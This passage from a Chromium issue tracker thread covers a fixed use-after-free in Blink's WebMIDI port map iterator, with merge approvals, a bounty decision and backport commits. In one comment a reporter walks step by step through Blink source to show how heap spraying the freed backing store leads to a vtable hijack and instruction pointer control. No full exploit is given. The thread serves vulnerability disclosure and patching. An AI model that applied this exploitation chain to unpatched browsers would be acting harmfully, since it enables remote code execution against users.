2. Low - The original CL needed to be manually resolved after failing to cherry-pick due to a conflict in a single file from https://crrev.com/c/6853575, which involved removing an unused parameter.
3. M146
4. Yes. The issue, as noted in https://buganizer.corp.google.com/issues/485935314#comment9, is believed to stem from a 2014 change (https://codereview.chromium.org/513203002). This older change reportedly became vulnerable around 2017 when heap compaction was enabled. Due to this history, the current fix must be merged back into the M138 branch.
 

### an...@google.com (2026-03-11)

Waiting until M146 is soaked in Stable

### wf...@chromium.org (2026-03-25)

[vrp panel] "In cases where a report displays an out-of-bounds read or access to a value without demonstrating a write or the potential for attacker control of that value or RCE, these issues may be considered for a lower reward amount, consistent with an information disclosure." we assessed this as such, but if you have evidence otherwise please feel free to present it. thanks.

### je...@gmail.com (2026-03-25)

deleted

### je...@gmail.com (2026-03-25)

Hi,

Thank you for the assessment. I'd like to present source-code-level evidence that this vulnerability is not limited to an out-of-bounds read or information disclosure — it provides a path to full program counter (PC/RIP) control via a virtual function call on an attacker-controlled object pointer.

Due to the heap spray layout dependency of this particular bug, I do not intend to provide a exploit. However, the call chain from the UAF to virtual dispatch is deterministic and does not depend on probabilistic conditions beyond the initial heap reclamation. I believe the following source code analysis clearly demonstrates that this is not merely a read primitive.

=== The Controlled Pointer ===

In the vulnerable code, FetchNextItem dereferences the dangling iterator into the compaction-relocated HeapVector backing:

```
// midi_port_map.h (vulnerable version, pre-fix)
bool FetchNextItem(ScriptState* script_state,
                   String& key, ValueType*& value, ExceptionState&) override {
    if (iterator_ == end_)
        return false;
    key = (*iterator_)->id();
    value = *iterator_;        // <-- attacker-controlled MIDIOutput*
    ++iterator_;
    return true;
}

```

After compaction, the backing store is freed and can be reclaimed via heap spraying (e.g., creating new HeapVector<Member<Node>> backings through querySelectorAll). The attacker controls the content at the old backing address, so `*iterator_` yields an attacker-chosen Member<MIDIOutput> value — i.e., a fake pointer `p`.

=== From Read to Virtual Call ===

The `value` returned by FetchNextItem (the attacker-controlled pointer `p`) does not stop at being read. It is consumed by the V8 binding layer, which wraps it into a JavaScript value. Here is the call chain:

Step 1 — PairSyncIterationSource::Next() passes the pointer to ToV8:

```
// iterable.h:76-79
case SyncIteratorBase::Kind::kValue: {
    v8::Local<v8::Value> v8_value =
        ToV8Traits<IDLValueType>::ToV8(script_state, value.content);
        //                                           ^^^^^^^^^^^^^ = p
    return ESCreateIterResultObject(script_state, false, v8_value);
}

```

Step 2 — ToV8Traits calls ScriptWrappable::ToV8() on the fake pointer:

```
// to_v8_traits.h:253-257
template <typename T>
  requires(std::derived_from<T, ScriptWrappable>)
struct ToV8Traits<T> {
  static v8::Local<v8::Value> ToV8(ScriptState* script_state,
                                   T* script_wrappable) {
    return script_wrappable->ToV8(script_state);
    //     ^^^^^^^^^^^^^^^^ = p (attacker-controlled)
  }
};

```

Step 3 — ScriptWrappable::ToV8() attempts to find an existing wrapper. The attacker ensures the inline wrapper\_ storage at the fake object is zeroed, so GetWrapper returns empty, falling through to Wrap():

```
// script_wrappable.cc:22-29
v8::Local<v8::Value> ScriptWrappable::ToV8(ScriptState* script_state) {
  v8::Local<v8::Object> wrapper;
  if (DOMDataStore::GetWrapper(script_state, this).ToLocal(&wrapper))
      [[likely]] {
    return wrapper;
  }
  return Wrap(script_state);  // <-- enters here with this = p
}

```

Step 4 — Wrap() calls ToWrapperTypeInfo(this), which invokes a virtual method on the attacker-controlled pointer:

```
// script_wrappable.cc:44-45
v8::Local<v8::Value> ScriptWrappable::Wrap(ScriptState* script_state) {
  const WrapperTypeInfo* wrapper_type_info = ToWrapperTypeInfo(this);
  // ...
}

// wrapper_type_info.cc:48-51
const WrapperTypeInfo* ToWrapperTypeInfo(const ScriptWrappable* wrappable) {
  return wrappable->GetWrapperTypeInfo();
  //     ^^^^^^^^^ = p -> VIRTUAL CALL through attacker-controlled vtable
}

```

Step 5 — GetWrapperTypeInfo() is a virtual method, defined by the DEFINE\_WRAPPERTYPEINFO macro used by every ScriptWrappable subclass:

```
// script_wrappable.h:164-168
#define DEFINE_WRAPPERTYPEINFO()
 public:
  const WrapperTypeInfo* GetWrapperTypeInfo() const override {
    return &wrapper_type_info_;
  }

```

Since `this` points to attacker-controlled memory, the CPU reads the vtable pointer from `*(p + 0)`, then loads the function pointer from `*(vtable + GetWrapperTypeInfo_offset)`, and jumps to it. The attacker controls both the vtable pointer and its contents via heap spraying, achieving full RIP control.

=== Summary ===

The exploitation primitive is:

```
UAF read of Member<MIDIOutput> from sprayed freed backing
  -> attacker-controlled C++ object pointer p
    -> ToV8Traits::ToV8(p) -> ScriptWrappable::ToV8(p)
      -> Wrap(p) -> ToWrapperTypeInfo(p)
        -> p->GetWrapperTypeInfo()  [virtual call]
          -> vtable hijack -> RIP control

```

Every step in this chain is a normal, unconditional code path in the Blink binding layer that executes for every iterator.next() call. The only precondition is that the attacker reclaims the freed backing store with controlled data, which is a standard Oilpan heap spray technique.

I acknowledge that building a full end-to-end exploit requires careful heap layout work, which is why I have not provided one. But the vulnerability class here is UAF-to-vtable-hijack with deterministic virtual dispatch on an attacker-controlled pointer — not an out-of-bounds read or information disclosure.

Thank you for reconsidering.

### sp...@google.com (2026-03-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Baseline. User information disclosure


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### an...@google.com (2026-04-01)

Merge approved for LTS-138

### dx...@google.com (2026-04-02)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Tiago Vignatti [vignatti@google.com](mailto:vignatti@google.com)  

Link:    <https://chromium-review.googlesource.com/7638330>

[M138-LTS] Store index instead of iterator in MIDIPortMap::MapIterationSource

---


Expand for full commit details
```
     
    M138 merge issues: 
      - The original CL needed to be manually resolved after failing to cherry-pick due to a conflict in a single file from https://crrev.com/c/6853575, which involved removing an unused parameter. 
     
    This avoids keeping pointers into the backing store of the entries 
    Vector<>. As a bonus it's also more compact. 
     
    Fixed: 485935314 
     
    (cherry picked from commit c9b1a8741a48f379a60d9c8f052b20ffa1c5e901) 
     
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7606579 
    Reviewed-by: Takashi Toyoshima <toyoshim@chromium.org> 
    Commit-Queue: Fredrik Söderquist <fs@opera.com> 
    Cr-Original-Commit-Position: refs/heads/main@{#1590718} 
    Change-Id: Ib2c9b4e339b818bd89e4f726bd32bd356559192f 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7638330 
    Owners-Override: Victor Gabriel Savu <vsavu@google.com> 
    Reviewed-by: Victor Gabriel Savu <vsavu@google.com> 
    Commit-Queue: Tiago Vignatti (xWF) <vignatti@google.com> 
    Reviewed-by: Fredrik Söderquist <fs@opera.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3518} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `third_party/blink/renderer/modules/webmidi/midi_port_map.h`

---

Hash: [b273f51a26e2853ff275585fe4a4f2f9dd5f71d9](https://chromiumdash.appspot.com/commit/b273f51a26e2853ff275585fe4a4f2f9dd5f71d9)  

Date: Thu Apr 2 18:14:10 2026


---

### pe...@google.com (2026-04-14)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### vi...@google.com (2026-04-14)

1. <https://chromium-review.git.corp.google.com/c/chromium/src/+/7755542>
2. Low - no conflicts
3. 138 and 146
4. Yes.

### dx...@google.com (2026-05-01)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Fredrik Söderquist [fs@opera.com](mailto:fs@opera.com)  

Link:    <https://chromium-review.googlesource.com/7755542>

[M144-LTS] Store index instead of iterator in MIDIPortMap::MapIterationSource

---


Expand for full commit details
```
     
    This avoids keeping pointers into the backing store of the entries 
    Vector<>. As a bonus it's also more compact. 
     
    Fixed: 485935314 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7606579 
    Reviewed-by: Takashi Toyoshima <toyoshim@chromium.org> 
    Commit-Queue: Fredrik Söderquist <fs@opera.com> 
    Cr-Commit-Position: refs/heads/main@{#1590718} 
    (cherry picked from commit c9b1a8741a48f379a60d9c8f052b20ffa1c5e901) 
     
    Change-Id: Ia1cfcf466f866aa955e9c6bc95f8aee61d0f3cfb 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7755542 
    Reviewed-by: Achuith Bhandarkar <achuith@chromium.org> 
    Owners-Override: Achuith Bhandarkar <achuith@chromium.org> 
    Commit-Queue: Tiago Vignatti (xWF) <vignatti@google.com> 
    Reviewed-by: Fredrik Söderquist <fs@opera.com> 
    Cr-Commit-Position: refs/branch-heads/7559@{#4845} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `third_party/blink/renderer/modules/webmidi/midi_port_map.h`

---

Hash: [b0ab6604bdcc7f9e23dd1b642a6da7d9126baa9a](https://chromiumdash.appspot.com/commit/b0ab6604bdcc7f9e23dd1b642a6da7d9126baa9a)  

Date: Fri May 1 20:35:20 2026


---

### ch...@google.com (2026-06-05)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485935314)*
